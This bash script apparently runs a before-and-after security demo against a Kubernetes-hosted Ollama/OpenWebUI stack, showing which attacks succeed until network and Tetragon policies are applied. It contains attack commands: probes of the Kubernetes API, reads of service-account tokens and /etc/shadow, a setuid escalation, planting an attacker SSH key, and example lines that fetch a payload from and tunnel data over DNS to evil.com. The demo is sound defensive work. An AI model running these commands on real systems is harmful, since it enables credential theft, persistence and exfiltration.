#!/bin/bash
# =============================================================================
# KPH LLM Security Demo - Attack Simulations
# =============================================================================
# This script demonstrates various attack vectors against unprotected LLM
# infrastructure. Run this BEFORE applying security policies to show 
# vulnerabilities, then run again AFTER to show policies blocking attacks.
#
# Usage: ./demo-attacks.sh [attack-name]
#        ./demo-attacks.sh all
# =============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log_attack() { echo -e "${RED}[ATTACK]${NC} $1"; }
log_result() { echo -e "${PURPLE}[RESULT]${NC} $1"; }
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }

# =============================================================================
# Attack 1: Lateral Movement via Internal Services
# =============================================================================
# Simulates an attacker attempting to access internal services they shouldn't
# be able to reach (Kubernetes API, services in other namespaces)
# =============================================================================
attack_egress_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 1: Lateral Movement to Internal Services"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution attempts to access"
    log_info "internal cluster services for lateral movement or data exfiltration."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Attack 1a: Try to access Kubernetes API (privilege escalation vector)
    log_info "1a: Attempting to access Kubernetes API server..."
    echo ""
    echo "Command: Connect to kubernetes.default.svc:443"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/kubernetes.default.svc/443" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
        echo "Connection established"
        log_result "⚠️  VULNERABLE: Kubernetes API access SUCCEEDED"
        log_result "Attacker could query API for secrets, escalate privileges!"
    else
        echo ""
        log_result "✅ BLOCKED: Kubernetes API access was blocked by network policy"
    fi

    echo ""

    # Attack 1b: Try to access OpenWebUI in another namespace (cross-namespace lateral movement)
    log_info "1b: Attempting cross-namespace access to OpenWebUI (llm-frontend)..."
    echo ""
    echo "Command: Connect to openwebui.llm-frontend.svc:8080"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- bash -c 'timeout 3 bash -c "echo > /dev/tcp/openwebui.llm-frontend.svc.cluster.local/8080" 2>/dev/null && echo "Connection established"' 2>/dev/null | grep -q "Connection established"; then
        echo "Connection established"
        log_result "⚠️  VULNERABLE: Cross-namespace access SUCCEEDED"
        log_result "Attacker could pivot to frontend services!"
    else
        echo ""
        log_result "✅ BLOCKED: Cross-namespace access was blocked by network policy"
    fi
}

# =============================================================================
# Attack 2: Shell Execution (RCE)
# =============================================================================
# Simulates an attacker achieving code execution and trying to spawn a shell
# =============================================================================
attack_shell_execution() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 2: Shell Execution (RCE Simulation)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker exploits CVE-2025-64496 or similar to"
    log_info "achieve code execution and tries to spawn a shell."
    echo ""
    log_info "Attempting to spawn /bin/sh in Ollama pod..."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    echo "Command: /bin/sh -c 'echo Shell spawned successfully; whoami; id'"
    echo ""
    
    # Try to spawn a shell and run commands
    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'echo "Shell spawned successfully"; whoami; id' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: Shell execution SUCCEEDED"
        log_result "Attacker could install persistence, pivot, or exfiltrate data!"
    else
        echo ""
        log_result "✅ BLOCKED: Shell execution was killed by Tetragon"
    fi
}

# =============================================================================
# Attack 3: Network Tool Usage
# =============================================================================
# Simulates an attacker trying to use curl/wget for further exploitation
# =============================================================================
attack_network_tools() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 3: Network Tool Usage (wget/curl)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution tries to download"
    log_info "additional payloads or establish a reverse shell."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    echo "Command: wget http://evil.com/payload.sh"
    echo ""
    
    if kubectl -n llm-system exec "$OLLAMA_POD" -- wget --timeout=5 http://example.com/test 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: wget execution SUCCEEDED"
    else
        echo ""
        log_result "✅ BLOCKED: wget was blocked by Tetragon or network policy"
    fi
}

# =============================================================================
# Attack 4: DNS Exfiltration
# =============================================================================
# Simulates data exfiltration via DNS queries
# =============================================================================
attack_dns_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 4: DNS Exfiltration"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker encodes stolen data in DNS queries to"
    log_info "an attacker-controlled nameserver, bypassing HTTP egress blocks."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Simulated exfiltration: encode data as subdomain
    ENCODED_DATA="c2VjcmV0X2RhdGE"  # base64 of "secret_data"
    
    echo "Command: nslookup ${ENCODED_DATA}.attacker-dns.evil.com"
    echo ""
    
    if kubectl -n llm-system exec "$OLLAMA_POD" -- nslookup "${ENCODED_DATA}.google.com" 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: External DNS query SUCCEEDED"
        log_result "Data could be exfiltrated via DNS tunneling!"
    else
        echo ""
        log_result "✅ BLOCKED: External DNS was blocked by Cilium DNS policy"
    fi
}

# =============================================================================
# Attack 5: Unauthorized Ollama API Access
# =============================================================================
# Simulates direct access to the Ollama API from an unauthorized source
# =============================================================================
attack_api_exposure() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 5: Unauthorized Ollama API Access"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker pod in another namespace tries to"
    log_info "directly access the Ollama API (model theft, resource hijacking)."
    echo ""

    # Create an attacker pod in the default namespace
    log_info "Creating attacker pod in default namespace..."
    
    kubectl run attacker-pod --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://ollama.llm-system.svc.cluster.local:11434/api/tags 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Unauthorized API access SUCCEEDED"
        log_result "Attacker could steal models or hijack inference resources!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Unauthorized API access was blocked by network policy"
    }
}

# =============================================================================
# Attack 6: Cross-Namespace Communication
# =============================================================================
# Simulates unauthorized pod-to-pod communication
# =============================================================================
attack_cross_namespace() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 6: Cross-Namespace Pod Communication"
    echo "============================================================="
    echo ""
    log_info "Scenario: A compromised pod in another namespace tries to"
    log_info "communicate directly with OpenWebUI backend, bypassing NGF."
    echo ""

    # Try to access OpenWebUI from default namespace (should go through NGF)
    log_info "Attempting to access OpenWebUI from unauthorized namespace..."
    echo ""
    
    kubectl run bypass-test --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://openwebui.llm-frontend.svc.cluster.local:8080/health 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Direct backend access SUCCEEDED (bypassing NGF)"
        log_result "Attacker could bypass NGF security controls!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Direct backend access was blocked by network policy"
    }
}

# =============================================================================
# Attack 7: Privilege Escalation (Tetragon-blockable)
# =============================================================================
# Simulates privilege escalation attempts that Tetragon TracingPolicies can
# detect and block: sensitive file reads, privesc syscalls, and persistence
# =============================================================================
attack_privilege_escalation() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 7: Privilege Escalation (Sensitive Files & Syscalls)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution attempts to escalate"
    log_info "privileges by reading secrets, using privesc syscalls, or"
    log_info "establishing persistence."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Attack 7a: Read Kubernetes Service Account Token
    log_info "7a: Attempting to read Kubernetes service account token..."
    echo ""
    echo "Command: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50; then
        echo "..."
        echo ""
        log_result "⚠️  VULNERABLE: Service account token read SUCCEEDED"
        log_result "Attacker could use token to access Kubernetes API!"
    else
        echo ""
        log_result "✅ BLOCKED: Token read was killed by Tetragon file policy"
    fi

    echo ""

    # Attack 7b: Read /etc/shadow (credential harvesting)
    log_info "7b: Attempting to read /etc/shadow..."
    echo ""
    echo "Command: cat /etc/shadow"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- cat /etc/shadow 2>/dev/null | head -3; then
        echo ""
        log_result "⚠️  VULNERABLE: /etc/shadow read SUCCEEDED"
        log_result "Attacker could crack password hashes!"
    else
        echo ""
        log_result "✅ BLOCKED: /etc/shadow read was blocked by Tetragon"
    fi

    echo ""

    # Attack 7c: Attempt setuid syscall (privilege escalation)
    log_info "7c: Attempting setuid syscall to escalate to root..."
    echo ""
    echo "Command: python3 -c 'import os; os.setuid(0); print(\"setuid succeeded\")'"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- python3 -c 'import os; os.setuid(0); print("setuid(0) succeeded - now root")' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: setuid syscall SUCCEEDED"
        log_result "Attacker could escalate privileges!"
    else
        echo ""
        log_result "✅ BLOCKED: setuid syscall was killed by Tetragon"
    fi

    echo ""

    # Attack 7d: Write SSH key for persistence
    log_info "7d: Attempting to write SSH key for persistence..."
    echo ""
    echo "Command: echo 'ssh-rsa ATTACKER_KEY' >> /root/.ssh/authorized_keys"
    echo ""

    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'mkdir -p /root/.ssh && echo "ssh-rsa AAAA_ATTACKER_KEY attacker@evil" >> /root/.ssh/authorized_keys && echo "SSH key written"' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: SSH key persistence SUCCEEDED"
        log_result "Attacker has persistent backdoor access!"
        # Clean up
        kubectl -n llm-system exec "$OLLAMA_POD" -- rm -f /root/.ssh/authorized_keys 2>/dev/null || true
    else
        echo ""
        log_result "✅ BLOCKED: Write to /root/.ssh was killed by Tetragon"
    fi
}

# =============================================================================
# Run All Attacks
# =============================================================================
run_all_attacks() {
    echo ""
    echo "============================================================="
    echo "  KPH LLM Security Demo - Running All Attack Simulations"
    echo "============================================================="
    
    attack_egress_exfiltration
    attack_shell_execution
    attack_network_tools
    attack_dns_exfiltration
    attack_api_exposure
    attack_cross_namespace
    attack_privilege_escalation

    echo ""
    echo "============================================================="
    echo "  Attack Simulation Complete"
    echo "============================================================="
    echo ""
    echo "If attacks succeeded (marked ⚠️  VULNERABLE), run:"
    echo "  ./apply-policies.sh"
    echo ""
    echo "Then re-run this script to see attacks blocked."
    echo ""
}

# =============================================================================
# Main
# =============================================================================
main() {
    case "${1:-all}" in
        egress)
            attack_egress_exfiltration
            ;;
        shell)
            attack_shell_execution
            ;;
        network)
            attack_network_tools
            ;;
        dns)
            attack_dns_exfiltration
            ;;
        api)
            attack_api_exposure
            ;;
        cross)
            attack_cross_namespace
            ;;
        privesc)
            attack_privilege_escalation
            ;;
        all)
            run_all_attacks
            ;;
        *)
            echo "Usage: $0 [egress|shell|network|dns|api|cross|privesc|all]"
            exit 1
            ;;
    esac
}

main "$@"
